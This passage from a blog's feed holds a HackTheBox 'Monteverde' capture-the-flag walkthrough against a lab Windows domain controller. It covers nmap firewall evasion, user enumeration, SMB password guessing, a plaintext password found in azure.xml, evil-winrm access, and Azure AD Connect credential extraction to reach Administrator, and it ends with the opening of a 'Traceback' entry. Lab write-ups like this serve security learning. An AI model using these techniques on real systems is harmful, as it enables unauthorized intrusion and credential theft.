&lt;&#x2F;span&gt;&lt;span&gt;389&#x2F;tcp  open  ldap
&lt;&#x2F;span&gt;&lt;span&gt;445&#x2F;tcp  open  microsoft-ds
&lt;&#x2F;span&gt;&lt;span&gt;464&#x2F;tcp  open  kpasswd5
&lt;&#x2F;span&gt;&lt;span&gt;593&#x2F;tcp  open  http-rpc-epmap
&lt;&#x2F;span&gt;&lt;span&gt;636&#x2F;tcp  open  ldapssl
&lt;&#x2F;span&gt;&lt;span&gt;3268&#x2F;tcp open  globalcatLDAP
&lt;&#x2F;span&gt;&lt;span&gt;3269&#x2F;tcp open  globalcatLDAPssl
&lt;&#x2F;span&gt;&lt;span&gt;Nmap done: 1 IP address (1 host up) scanned in 5.62 seconds
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I scanned the UDP ports as well while I am at it.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;jtuyen@bpsi:~&#x2F;Documents&#x2F;hackthebox&#x2F;monteverde$ sudo nmap monteverde -p- -sU
&lt;&#x2F;span&gt;&lt;span&gt;Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-03-21 10:15 EDT
&lt;&#x2F;span&gt;&lt;span&gt;Nmap scan report for monteverde (10.10.10.172)
&lt;&#x2F;span&gt;&lt;span&gt;Host is up (0.029s latency).
&lt;&#x2F;span&gt;&lt;span&gt;Not shown: 65532 open|filtered ports
&lt;&#x2F;span&gt;&lt;span&gt;PORT    STATE SERVICE
&lt;&#x2F;span&gt;&lt;span&gt;53&#x2F;udp  open  domain
&lt;&#x2F;span&gt;&lt;span&gt;123&#x2F;udp open  ntp
&lt;&#x2F;span&gt;&lt;span&gt;389&#x2F;udp open  ldap
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Nmap done: 1 IP address (1 host up) scanned in 144.19 seconds
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;After playing around with the &lt;code&gt;nmap&lt;&#x2F;code&gt; switches, I found that &lt;code&gt;-f&lt;&#x2F;code&gt; will bypass the firewall restrictions.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;jtuyen@bpsi:~&#x2F;Documents&#x2F;hackthebox&#x2F;monteverde$ sudo nmap -sC -sV monteverde -f
&lt;&#x2F;span&gt;&lt;span&gt;Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-03-21 10:25 EDT
&lt;&#x2F;span&gt;&lt;span&gt;Nmap scan report for monteverde (10.10.10.172)
&lt;&#x2F;span&gt;&lt;span&gt;Host is up (0.028s latency).
&lt;&#x2F;span&gt;&lt;span&gt;Not shown: 989 filtered ports
&lt;&#x2F;span&gt;&lt;span&gt;PORT     STATE SERVICE       VERSION
&lt;&#x2F;span&gt;&lt;span&gt;53&#x2F;tcp   open  domain?
&lt;&#x2F;span&gt;&lt;span&gt;| fingerprint-strings: 
&lt;&#x2F;span&gt;&lt;span&gt;|   DNSVersionBindReqTCP: 
&lt;&#x2F;span&gt;&lt;span&gt;|     version
&lt;&#x2F;span&gt;&lt;span&gt;|_    bind
&lt;&#x2F;span&gt;&lt;span&gt;88&#x2F;tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-21 13:35:55Z)
&lt;&#x2F;span&gt;&lt;span&gt;135&#x2F;tcp  open  msrpc         Microsoft Windows RPC
&lt;&#x2F;span&gt;&lt;span&gt;139&#x2F;tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
&lt;&#x2F;span&gt;&lt;span&gt;389&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
&lt;&#x2F;span&gt;&lt;span&gt;445&#x2F;tcp  open  microsoft-ds?
&lt;&#x2F;span&gt;&lt;span&gt;464&#x2F;tcp  open  kpasswd5?
&lt;&#x2F;span&gt;&lt;span&gt;593&#x2F;tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
&lt;&#x2F;span&gt;&lt;span&gt;636&#x2F;tcp  open  tcpwrapped
&lt;&#x2F;span&gt;&lt;span&gt;3268&#x2F;tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
&lt;&#x2F;span&gt;&lt;span&gt;3269&#x2F;tcp open  tcpwrapped
&lt;&#x2F;span&gt;&lt;span&gt;1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :
&lt;&#x2F;span&gt;&lt;span&gt;SF-Port53-TCP:V=7.80%I=7%D=3&#x2F;21%Time=5E7623F3%P=x86_64-pc-linux-gnu%r(DNSV
&lt;&#x2F;span&gt;&lt;span&gt;SF:ersionBindReqTCP,20,&amp;quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
&lt;&#x2F;span&gt;&lt;span&gt;SF:x04bind\0\0\x10\0\x03&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Host script results:
&lt;&#x2F;span&gt;&lt;span&gt;|_clock-skew: -49m54s
&lt;&#x2F;span&gt;&lt;span&gt;| smb2-security-mode: 
&lt;&#x2F;span&gt;&lt;span&gt;|   2.02: 
&lt;&#x2F;span&gt;&lt;span&gt;|_    Message signing enabled and required
&lt;&#x2F;span&gt;&lt;span&gt;| smb2-time: 
&lt;&#x2F;span&gt;&lt;span&gt;|   date: 2020-03-21T13:38:31
&lt;&#x2F;span&gt;&lt;span&gt;|_  start_date: N&#x2F;A
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
&lt;&#x2F;span&gt;&lt;span&gt;Nmap done: 1 IP address (1 host up) scanned in 333.92 seconds
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I noticed there was a SMB share so I decided to try and use &lt;code&gt;smbmap&lt;&#x2F;code&gt; to mount the share for hints. Access is denied.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;jtuyen@bpsi:~&#x2F;Documents&#x2F;hackthebox&#x2F;monteverde$ smbmap -H monteverde
&lt;&#x2F;span&gt;&lt;span&gt;[+] Finding open SMB ports....
&lt;&#x2F;span&gt;&lt;span&gt;[+] User SMB session established on monteverde...
&lt;&#x2F;span&gt;&lt;span&gt;[+] IP: monteverde:445  Name: unknown                                           
&lt;&#x2F;span&gt;&lt;span&gt;        Disk                                                    Permissions     Comment
&lt;&#x2F;span&gt;&lt;span&gt;        ----                                                    -----------     -------
&lt;&#x2F;span&gt;&lt;span&gt;[!] Access Denied
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I did a quick &lt;code&gt;dig&lt;&#x2F;code&gt; command to quickly enumerate the DNS service for possible hints. None found.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;jtuyen@bpsi:~&#x2F;Documents&#x2F;hackthebox&#x2F;monteverde$ dig 172.0.0.10.in-addr.arpa PTR @10.10.10.172
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.11.14-3-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; 172.0.0.10.in-addr.arpa PTR @10.10.10.172
&lt;&#x2F;span&gt;&lt;span&gt;;; global options: +cmd
&lt;&#x2F;span&gt;&lt;span&gt;;; Got answer:
&lt;&#x2F;span&gt;&lt;span&gt;;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: SERVFAIL, id: 53395
&lt;&#x2F;span&gt;&lt;span&gt;;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;;; OPT PSEUDOSECTION:
&lt;&#x2F;span&gt;&lt;span&gt;; EDNS: version: 0, flags:; udp: 4000
&lt;&#x2F;span&gt;&lt;span&gt;;; QUESTION SECTION:
&lt;&#x2F;span&gt;&lt;span&gt;;172.0.0.10.in-addr.arpa.       IN      PTR
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;;; Query time: 2345 msec
&lt;&#x2F;span&gt;&lt;span&gt;;; SERVER: 10.10.10.172#53(10.10.10.172)
&lt;&#x2F;span&gt;&lt;span&gt;;; WHEN: Sat Mar 21 10:42:37 EDT 2020
&lt;&#x2F;span&gt;&lt;span&gt;;; MSG SIZE  rcvd: 52
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;In the &lt;code&gt;nmap&lt;&#x2F;code&gt; results, I noticed the LDAP port is open and provided a domain name result. I enumerated the service using &lt;code&gt;ldapsearch&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;ldapsearch -h monteverde -p 389 -x -b &amp;quot;DC=MEGABANK,DC=LOCAL&amp;quot; -W
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Next, I used &lt;code&gt;enum4linux&lt;&#x2F;code&gt; to see if there are any hints. I found couple of service accounts and user accounts that will be useful to continue the enumeration process.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt; =========================== 
&lt;&#x2F;span&gt;&lt;span&gt;|    Users on monteverde    |
&lt;&#x2F;span&gt;&lt;span&gt; =========================== 
&lt;&#x2F;span&gt;&lt;span&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at .&#x2F;enum4linux.pl line 866.
&lt;&#x2F;span&gt;&lt;span&gt;index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
&lt;&#x2F;span&gt;&lt;span&gt;index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
&lt;&#x2F;span&gt;&lt;span&gt;index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer&#x2F;domain
&lt;&#x2F;span&gt;&lt;span&gt;index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
&lt;&#x2F;span&gt;&lt;span&gt;index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O&amp;#39;Leary       Desc: (null)
&lt;&#x2F;span&gt;&lt;span&gt;index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
&lt;&#x2F;span&gt;&lt;span&gt;index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
&lt;&#x2F;span&gt;&lt;span&gt;index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
&lt;&#x2F;span&gt;&lt;span&gt;index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
&lt;&#x2F;span&gt;&lt;span&gt;index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I tried the low hanging fruit of seeing if the users are susceptible to ASREPRoast using the user account information found in the previous step. No accounts were found to be vulnerable.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;(impacket) jtuyen@bpsi:~&#x2F;Tools&#x2F;Windows&#x2F;impacket&#x2F;examples$ .&#x2F;GetNPUsers.py -dc-ip 10.10.10.172 MEGABANK&#x2F;DGalanos
&lt;&#x2F;span&gt;&lt;span&gt;Impacket v0.9.21.dev1+20200225.153700.afe746d2 - Copyright 2020 SecureAuth Corporation
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Password:
&lt;&#x2F;span&gt;&lt;span&gt;[*] Cannot authenticate DGalanos, getting its TGT
&lt;&#x2F;span&gt;&lt;span&gt;[-] User DGalanos doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;&#x2F;span&gt;&lt;span&gt;(impacket) jtuyen@bpsi:~&#x2F;Tools&#x2F;Windows&#x2F;impacket&#x2F;examples$ .&#x2F;GetNPUsers.py -dc-ip 10.10.10.172 MEGABANK&#x2F;roleary
&lt;&#x2F;span&gt;&lt;span&gt;Impacket v0.9.21.dev1+20200225.153700.afe746d2 - Copyright 2020 SecureAuth Corporation
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Password:
&lt;&#x2F;span&gt;&lt;span&gt;[*] Cannot authenticate roleary, getting its TGT
&lt;&#x2F;span&gt;&lt;span&gt;[-] User roleary doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;&#x2F;span&gt;&lt;span&gt;(impacket) jtuyen@bpsi:~&#x2F;Tools&#x2F;Windows&#x2F;impacket&#x2F;examples$ .&#x2F;GetNPUsers.py -dc-ip 10.10.10.172 MEGABANK&#x2F;smorgan
&lt;&#x2F;span&gt;&lt;span&gt;Impacket v0.9.21.dev1+20200225.153700.afe746d2 - Copyright 2020 SecureAuth Corporation
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Password:
&lt;&#x2F;span&gt;&lt;span&gt;[*] Cannot authenticate smorgan, getting its TGT
&lt;&#x2F;span&gt;&lt;span&gt;[-] User smorgan doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Running low on the number of enumerations, I&#x27;ve resorted to brute forcing the SMB accounts. After numerous attempts of brute forcing various accounts, I found one that works: &lt;code&gt;MEGABANK\SABatchJobs:SABatchJobs&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-1.png&quot; alt=&quot;htb-monteverde-1.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I re-ran &lt;code&gt;smbmap&lt;&#x2F;code&gt; again using the new credentials and found a listing of files and folders.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-2.png&quot; alt=&quot;htb-monteverde-2.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Used &lt;code&gt;smbclient&lt;&#x2F;code&gt; to enumerate what is inside users folders and an &lt;code&gt;azure.xml&lt;&#x2F;code&gt; item stood out. Upon reading the file, it contained a password which I&#x27;m not sure what can be used for yet.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-3.png&quot; alt=&quot;htb-monteverde-3.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-4.png&quot; alt=&quot;htb-monteverde-4.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-5.png&quot; alt=&quot;htb-monteverde-5.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Logon credentials has been found: &lt;code&gt;mhope:4n0therD4y@n0th3r$&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I tested the credentials to verify samba access.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-6.png&quot; alt=&quot;htb-monteverde-6.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;After being stuck on the problem for a while, I went back to do &lt;code&gt;nmap&lt;&#x2F;code&gt; scan again on all ports because I couldn&#x27;t find any other way to gain remote access using the password that I&#x27;ve found. One step that I forgot to perform in the beginning was to scan all 65535 TCP ports to make sure I have it all covered. I found additional open ports but most notably is port 5985.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;jtuyen@bpsi:~&#x2F;Documents&#x2F;hackthebox&#x2F;monteverde$ sudo nmap -p- -f monteverde
&lt;&#x2F;span&gt;&lt;span&gt;[sudo] password for jtuyen: 
&lt;&#x2F;span&gt;&lt;span&gt;Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-03-21 13:40 EDT
&lt;&#x2F;span&gt;&lt;span&gt;Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
&lt;&#x2F;span&gt;&lt;span&gt;SYN Stealth Scan Timing: About 2.68% done; ETC: 14:06 (0:24:51 remaining)
&lt;&#x2F;span&gt;&lt;span&gt;Stats: 0:02:29 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
&lt;&#x2F;span&gt;&lt;span&gt;SYN Stealth Scan Timing: About 28.55% done; ETC: 13:49 (0:06:13 remaining)
&lt;&#x2F;span&gt;&lt;span&gt;Nmap scan report for monteverde (10.10.10.172)
&lt;&#x2F;span&gt;&lt;span&gt;Host is up (0.035s latency).
&lt;&#x2F;span&gt;&lt;span&gt;Not shown: 65516 filtered ports
&lt;&#x2F;span&gt;&lt;span&gt;PORT      STATE SERVICE
&lt;&#x2F;span&gt;&lt;span&gt;53&#x2F;tcp    open  domain
&lt;&#x2F;span&gt;&lt;span&gt;88&#x2F;tcp    open  kerberos-sec
&lt;&#x2F;span&gt;&lt;span&gt;135&#x2F;tcp   open  msrpc
&lt;&#x2F;span&gt;&lt;span&gt;139&#x2F;tcp   open  netbios-ssn
&lt;&#x2F;span&gt;&lt;span&gt;389&#x2F;tcp   open  ldap
&lt;&#x2F;span&gt;&lt;span&gt;445&#x2F;tcp   open  microsoft-ds
&lt;&#x2F;span&gt;&lt;span&gt;464&#x2F;tcp   open  kpasswd5
&lt;&#x2F;span&gt;&lt;span&gt;593&#x2F;tcp   open  http-rpc-epmap
&lt;&#x2F;span&gt;&lt;span&gt;636&#x2F;tcp   open  ldapssl
&lt;&#x2F;span&gt;&lt;span&gt;3268&#x2F;tcp  open  globalcatLDAP
&lt;&#x2F;span&gt;&lt;span&gt;3269&#x2F;tcp  open  globalcatLDAPssl
&lt;&#x2F;span&gt;&lt;span&gt;5985&#x2F;tcp  open  wsman
&lt;&#x2F;span&gt;&lt;span&gt;9389&#x2F;tcp  open  adws
&lt;&#x2F;span&gt;&lt;span&gt;49667&#x2F;tcp open  unknown
&lt;&#x2F;span&gt;&lt;span&gt;49673&#x2F;tcp open  unknown
&lt;&#x2F;span&gt;&lt;span&gt;49674&#x2F;tcp open  unknown
&lt;&#x2F;span&gt;&lt;span&gt;49675&#x2F;tcp open  unknown
&lt;&#x2F;span&gt;&lt;span&gt;49706&#x2F;tcp open  unknown
&lt;&#x2F;span&gt;&lt;span&gt;49778&#x2F;tcp open  unknown
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Nmap done: 1 IP address (1 host up) scanned in 445.93 seconds
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I used &lt;code&gt;evil-winrm&lt;&#x2F;code&gt; to gain remote access on port 5985 and the user flag has been obtained.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-7.png&quot; alt=&quot;htb-monteverde-7.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-8.png&quot; alt=&quot;htb-monteverde-8.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;After digging around looking for clues inside the system, I found a hidden Azure directory.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-9.png&quot; alt=&quot;htb-monteverde-9.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;After spending some time Googling what possible abuse and exploits can be performed. I stumbled on this link that could be useful for my future penetration tests in the real world: &lt;a href=&quot;https:&#x2F;&#x2F;www.lares.com&#x2F;hunting-azure-admins-for-vertical-escalation&#x2F;&quot;&gt;https:&#x2F;&#x2F;www.lares.com&#x2F;hunting-azure-admins-for-vertical-escalation&#x2F;&lt;&#x2F;a&gt;. The gist of the article is about compromising a workstation that contains access to Azure resources by using the cached token for authentication.&lt;&#x2F;p&gt;
&lt;p&gt;I decided to try and take a stab and see if it was possible.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-10.png&quot; alt=&quot;htb-monteverde-10.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-11.png&quot; alt=&quot;htb-monteverde-11.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Let&#x27;s try and download the &lt;code&gt;TokenCache.dat&lt;&#x2F;code&gt; and inspect what is inside.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-12.png&quot; alt=&quot;htb-monteverde-12.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-13.png&quot; alt=&quot;htb-monteverde-13.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The token file looks interesting and valid? I&#x27;m not sure yet.&lt;&#x2F;p&gt;
&lt;p&gt;The next enumeration commands shows if the user has installed &lt;code&gt;Az&lt;&#x2F;code&gt; modules used for connecting to Azure resources and the connection history log file.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-14.png&quot; alt=&quot;htb-monteverde-14.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-15.png&quot; alt=&quot;htb-monteverde-15.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Looks like it has been connected to Azure at some point of time.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-16.png&quot; alt=&quot;htb-monteverde-16.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;It doesn&#x27;t look too hopeful at the moment to be exploiting a real Azure environment.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-17.png&quot; alt=&quot;htb-monteverde-17.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Token cache data is empty hence why you can&#x27;t connect to Azure. At least I learned something about the process of Azure enumeration.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-18.png&quot; alt=&quot;htb-monteverde-18.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Moving on, I was Googling for other ways to exploit Azure AD Sync and I came upon this &lt;a href=&quot;https:&#x2F;&#x2F;blog.xpnsec.com&#x2F;azuread-connect-for-redteam&#x2F;&quot;&gt;script&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The script didn&#x27;t work because it couldn&#x27;t find the LocalDB database. I figure it was some sort of enumeration of MSSQL table database but I couldn&#x27;t find a good way to do it. I should find out more about this later.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;After googling some more, I came upon another &lt;a href=&quot;https:&#x2F;&#x2F;vbscrub.video.blog&#x2F;2020&#x2F;01&#x2F;14&#x2F;azure-ad-connect-database-exploit-priv-esc&#x2F;&quot;&gt;script&lt;&#x2F;a&gt; that was related and has the ability to enumerate all databases.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;cd &amp;quot;C:\Program Files\Microsoft Azure AD Sync\Bin&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-19.png&quot; alt=&quot;htb-monteverde-19.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-20.png&quot; alt=&quot;htb-monteverde-20.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Using the discovered Administrator credential, using &lt;code&gt;evil-winrm&lt;&#x2F;code&gt; again, I was able to obtain the &lt;code&gt;root.txt&lt;&#x2F;code&gt; flag.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-monteverde&#x2F;htb-monteverde-21.png&quot; alt=&quot;htb-monteverde-21.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Traceback</title>
        <published>2020-03-17T00:00:00+00:00</published>
        <updated>2020-03-17T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-traceback/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-traceback/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;nmap -sC -sV -oA traceback 10.10.10.181
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;nmap&lt;&#x2F;code&gt; scans show scans show ports 22 and 80 is open.&lt;&#x2F;p&gt;
